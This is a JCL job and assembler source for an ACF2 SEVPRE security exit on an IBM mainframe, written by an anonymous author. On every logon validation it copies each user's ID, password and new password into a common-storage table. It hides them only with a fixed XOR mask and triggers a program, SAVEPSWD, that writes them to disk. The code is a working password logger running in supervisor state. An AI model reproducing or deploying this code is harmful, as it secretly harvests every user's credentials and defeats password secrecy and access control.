//SOMITCWS JOB (xxxxxxxx,xxxx,1439,9999,9999),SEVPRE-SOMITCW,
//             CLASS=x,MSGCLASS=x,
//             NOTIFY=SOMITCW,COND=(0,NE)
//SEVPRE  EXEC HLASMCL,PARM.C=(NODECK,OBJECT,RENT),
//             PARM.L='REFR,RENT,REUS,AC=1,LIST,MAP'
//SYSLIB   DD  DSN=SYS1.MACLIB,DISP=SHR
//         DD  DSN=SYS1.MODGEN,DISP=SHR
//         DD  DSN=SYS1.CAI.CAIMAC,DISP=SHR
//         DD  DSN=SYS1.SORCPROD,DISP=SHR  For the VCCS CVTUSER DSECT
//* SYS1.SORCPROD must be after MACLIB with the WTO MACRO
PASS     TITLE 'SEVPRE - Record ACF2 Passwords'
* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
*
*   Title: SEVPRE
*
*   Author: I ain't saying.
*
*   Date-written:  1999-4-12
*
*   Change Log:
*
* xx-xx-xx x
*  x.x.x.
*
*   Remarks:
*
*        This exit gets control on any ACVALD request to ACF2.
*   If the request is a logonid/password validate request, then
*   it saves a user's userid, password, new-password, date, and
*   time in a table in ECSA.  If not validate, no action is taken.
*   Program SAVEPSWD will write the data to disk file.
*
* 7.25 System Entry Validation Preprocessing Exit (SEVPRE)
*
* The System Entry Validation Preprocessing exit (SEVPRE) enables
* you to inspect and modify a system entry validation (SEV)
* request before the validation is performed.  It enables you to
* return a site message to the requester and deny the request.
*
* If no error occurs before calling the exit (that is, during
* initialization), the ACFSVC TYPE=A SVC calls SEVPRE for all
* valid SEV subfunctions in the ACVALD parameter list.
*
* The ACFSFXP parameter list is passed to the SEVPRE exit;
* however, because other exits use this parameter list, not all
* fields relate to SEVPRE.  The following fields are set to zero
* when this exit is called:
*
*    SXPORECA
*    SXPODATA
*    SXPOAREA
*    SXPORECL
*    SXPODATL
*    SXPNAREA
*    SXPNRECA
*    SXPNDATA
*    SXPFRMSF
*    SXPNRECL
*    SXPNDATL
*    SXPFFAIL
*
* In addition, CA-ACF2 ignores the SXPFNUPD field on return from
* the exit.  Refer to the ACFSFXP parameter list in Chapter 5,
* "Parameter Lists and Mapping Macros," for detailed field
* descriptions and information about which fields this exit
* updates.
*
* +--- Caution -------------------------------------------------------+
* ¦                                                                   ¦
* ¦ Use of SEVPRE can open an INTEGRITY EXPOSURE.  Any accesses       ¦
* ¦ permitted by  this  exit are not reflected in the standard        ¦
* ¦ CA-ACF2 processing or documentation.                              ¦
* +-------------------------------------------------------------------+
*
* Specification:  GSO EXITS record, SEVPRE field
*
* Attributes:  Reentrant, AMODE 31, RMODE ANY
*
* Environment:  Key 0, supervisor state
* Step-must-complete enqueue may be in effect
*
* Input:  Uses a standard OS calling sequence:
*
* R0   The address of a 512-byte work area
*
* R1   The address of the SEVPRE parameter list.
*      The ACFSFXP macro contains the mapping for this area.
*
* Output:  SEVPRE must restore R0 through R14 and set
*          a return code in R15.
*
* R15  Set one of the following return codes:
*
*      0       Continue SEV processing.
*
*      8       Fail SEV processing and issue a message stating
*              that SEV processing has failed.
*
*      other   Fail SEV processing and issue a message stating
*              that an invalid return code has been set.  The exit
*              may intentionally set an invalid return code to
*              notify you of an unexpected error condition.  We
*              recommend that any site-defined return codes not be
*              multiples of four, so that they do not conflict
*              with CA-ACF2-defined return codes.
*
* If SEVPRE sets a return code greater than zero,
* SEVPOST is not called.
*
* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
SEVPRE   CSECT ,
SEVPRE   AMODE 31
SEVPRE   RMODE ANY
         SAVE  (14,12),,SEVPRE.&SYSDATE..&SYSTIME   Save caller's regs.
         LR    R12,R15            Load address of entry point
         USING SEVPRE,R12         Give assembler program's base reg.
         LR    R11,R1             Load the address of the ACFSFXP
*                                 ACF2 Service Function Exit Parms
         USING ACFSFXP,R11        Addressing ACFSFXP
         L     R11,SXPFRBA        Load the address of the ACVALD
         USING ACVALD,R11         Addressing ACVALD
         CLI   ACVSFCN,ACVSVALD   See if a lid/pswd validation request
         BE    GOTUSER            Is normal validation, go process
         CLI   ACVSFCN,ACVSMVAL   See if lid/pswd val.req.from Musass
         BNE   RETURN             Not validation request, go exit
GOTUSER  DS    0H
         L     R9,16              Load the address of the CVT
         ICM   R8,B'1111',CVTUSER-CVT(R9)  Address CVTUSER points to
         BZ    RETURN             If no CVTUSER cannot save, get out
         USING XCVTUSER,R8        Tell assembler about DSECT
         CLC   XCVTUEYE,CCVTUSER  See if the CVTUSER area is mine
         BNE   RETURN             If someone else has CVTUSER, go exit
         ICM   R8,B'1111',XCVTPSWD  Address CVTUSER points to
         USING SAVEPW,R8          Tell assembler about DSECT
         BZ    RETURN             No CVT Anchor, SAVEPSWD not run yet
         CLC   EYECATCH,CLGNIXIT  See if the save area starts okay
         BNE   RETURN             Bad CVT Anchor, shouldn't occur, exit
RETRY    DS    0H
         CLC   FULL,NEXTSAVE      See if table is full
         BL    RETURN             Table is full, go exit
         CLC   NEARFULL,NEXTSAVE  See if table is 75% full
         BE    DUMPIT             Close to full, go dump it
SAVEUSER DS    0H
         L     R9,NEXTSAVE        Load address of next save space
         LA    R7,ENTRYSZ(,R9)    Calculate the next entry address
         CS    R9,R7,NEXTSAVE     Change the current address to next
         BNZ   RETRY              If change failed, go try again
         MVC   0(24,R9),MASK      Mask userid, password, & new-password
         XC    0(24,R9),ACVLID    Save userid, password, & new password
         DROP  R11                Don't need ACF2 ACVALD anymore
         TIME  DEC                Get date and time
         X     R1,MASK            Mask the date
         ST    R1,24(,R9)         Store the date
         X     R0,MASK            Mask the time
         ST    R0,28(,R9)         Store the time
*        B     RETURN             Go to exit, message first line okay
         DROP  R8                 Drop pointer to area for SAVEPW table
RETURN   DS    0H
         SLR   R15,R15            Set a return code of zero
         RETURN (14,12),RC=(15)   Return to caller, return code zero
*
DUMPIT   DS    0H
         WTO   'ACF2 exit SEVPRE area is near full',ROUTCDE=(1,11)
         WTO   'Exit will issue command: S R,Q=SAVEPSWD',ROUTCDE=(1,11)
         SLR   R0,R0              Set console zero
         LA    R1,STARTCMD        Load addr. of the command for SVC 34
         SVC   34                 Issue command: S R,Q=SAVEPSWD
         B     SAVEUSER           Return to save user and password data
*
CCVTUSER DC    CL7'CVTUSER',XL1'1' Constant to init and check CVTUSER
CLGNIXIT DC    CL7'LGNIXIT',XL1'1' Constant to init and check SAVEPW
STARTCMD DC    AL2(23),AL2(0),CL19'START R,Q=SAVEPSWD '
         DS    0F                 Align mask for 'X' op-code
MASK     DC    CL24'vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv'  Encryption mask
*
         COPY  CVTUSER            VCCS user DSECT in SYS1.SORCPROD
*
* XCVTUSER DSECT ,
* XCVTUEYE DS    CL8              7 bytes of 'CVTUSER' and 1 byte X'01'
* XCVTUVOL DS    XL6              VOLSER from message used by IEC507D
*          DS    XL2              Space available for expansion
* XCVTUTIM DS    XL6              CYYDDDHHMMSS Century, Year,Day, Hour,
*                                 Minute, and Second, used by IOS000I
*          DS    XL2              Space available for expansion
* XCVTPSWD DS    F                ACF2 LGNIXIT anchor, used by SAVEPSWD
*          DS    XL20             Space available for expansion
* XCVTUSIZ EQU   *-XCVTUSER       Length of area pointed to by CVTUSER
*
*
*
SAVEPW   DSECT ,
EYECATCH DS    CL8                7 bytes of 'LGNIXIT' and 1 byte X'01'
NEXTSAVE DS    F                  Address of current available entry
NEARFULL DS    F                  Addr. of end of 75% pswd storage area
FULL     DS    F                  Addr. of end of password storage area
ENTRIES  DS    XL32680            Location to save passwords in
ENTRYSZ  EQU   32                 Thirty-Two bytes per entry
SAVEPWSZ EQU   *-SAVEPW           Length of the password entry storage
*
         ACFSFXP DSECT=YES        ACF2 exit parameter list from reg.1
*
         ACVALD DSECT=YES         ACF2 exit parameter list from ACFSFXP
*
         CVT   DSECT=YES          MVS's Communications Vector Table
*
R0       EQU   0
R1       EQU   1                  R
R2       EQU   2                    E
R3       EQU   3                      G
R4       EQU   4                        I
R5       EQU   5                          S
R6       EQU   6                            T
R7       EQU   7                              E
R8       EQU   8                                R
R9       EQU   9                  E
R10      EQU   10                   Q
R11      EQU   11                     U
R12      EQU   12                       A
R13      EQU   13                         T
R14      EQU   14                           E
R15      EQU   15                             S
         END   ,
//L.SYSLMOD DD DSN=SYS1.LOADPROD,DISP=SHR,SPACE=
 NAME SEVPRE
